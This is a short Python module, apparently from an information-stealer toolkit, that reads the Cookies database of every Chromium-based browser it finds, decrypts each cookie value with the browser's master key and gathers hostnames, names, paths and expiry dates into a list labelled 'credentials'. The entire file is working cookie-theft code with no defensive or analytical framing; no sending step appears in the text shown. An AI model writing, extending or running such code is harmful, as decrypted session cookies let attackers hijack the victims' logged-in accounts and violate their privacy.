
# Import modules
from . import GetMasterKey, FetchDataBase, DecryptValue, ConvertDate, GetBrowsers

""" Fetch cookies from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + "\\Cookies", "SELECT * FROM cookies")
        for row in database:
            cookie = {
                "value": DecryptValue(row[12], master_key),
                "hostname": row[1],
                "name": row[2],
                "path": row[4],
                "expires": ConvertDate(row[5]),
                "secure": bool(row[6])
            }
            credentials.append(cookie)

    return credentials
